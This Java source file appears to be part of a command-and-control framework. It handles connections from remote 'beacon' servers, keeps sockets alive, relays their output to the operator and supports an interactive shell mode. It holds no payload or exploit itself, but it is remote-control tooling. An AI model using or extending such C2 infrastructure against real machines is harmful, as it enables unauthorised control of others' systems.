package Servers.C2;

import java.io.IOException;
import Servers.Duplexer;
import Servers.keepAlive;

public class C2ServerBeaconHandler implements Runnable{
    // IP address of the Long Range Becaon that this thread is handling
    public String IP;

    // Duplexer send and receive from the Long Range Beacon
    private Duplexer duplexer;

    // Pointer to the C2 Server
    private C2Server C2server;

    // Class and Thread that send a KEEP_ALIVE Messsage to the Beacon Server every 30 seconds to keep the socket open
    private keepAlive keepAliveClass;
    private Thread keepAliveThread;
    private Object sendLock;

    // Variables used when the user is in shell mode
    private Boolean isShell;
    private Object shellLock;

    /**
     * Creates a new thread to handle each Long Range Beacon
     * 
     * @param duplexer Duplexer to send and receive from the long range beacon
     * @param IP IP address of the long range Beacon that this thread is handling
     * @param server Pointer to the C2 Server
     */
    protected C2ServerBeaconHandler(Duplexer duplexer, String IP, C2Server server, Object shellLock){
        this.duplexer = duplexer;
        this.IP = IP;
        this.C2server = server;
        this.sendLock = new Object();
        this.keepAliveClass = new keepAlive(duplexer, sendLock, false, false);
        this.keepAliveThread = new Thread(keepAliveClass);
        this.isShell = false;
        this.shellLock = shellLock;
    }

    protected void setIsShell(Boolean value){
        this.isShell = value;
    }

    /**
     * Sends a message to the Long Range Beacon Server from the C2 Server
     * 
     * @param message
     */
    protected void sendToBeacon(String message){
        synchronized(sendLock){
            duplexer.send(message);
        }
    }

    @Override
    public void run() {
        Boolean notify;
        try {
            boolean sentinel = true;
            keepAliveThread.start();
            while(sentinel){
                notify = false;
                String response = duplexer.receive();
                if(!(response.equals("KEEP_ALIVE"))){
                    if(response.contains("END_OF_OUTPUT")){
                        notify = true;
                        response = response.substring(0, response.indexOf("END_OF_OUTPUT"));
                    }
                    C2server.outputToUserHandler(response);
                    if(notify && isShell){
                        synchronized(shellLock){
                            shellLock.notify();
                        }
                    }
                }   
            }
        } catch (IOException e) {
            String errorMessage = "Lost Beacon Server at " + IP;
            C2server.outputToUserHandler(errorMessage);
            keepAliveClass.stopKeepAlive();
        } catch (NullPointerException e) {
            String errorMessage = "Lost Beacon Server at " + IP;
            C2server.outputToUserHandler(errorMessage);
            keepAliveClass.stopKeepAlive();
        }
    }
}
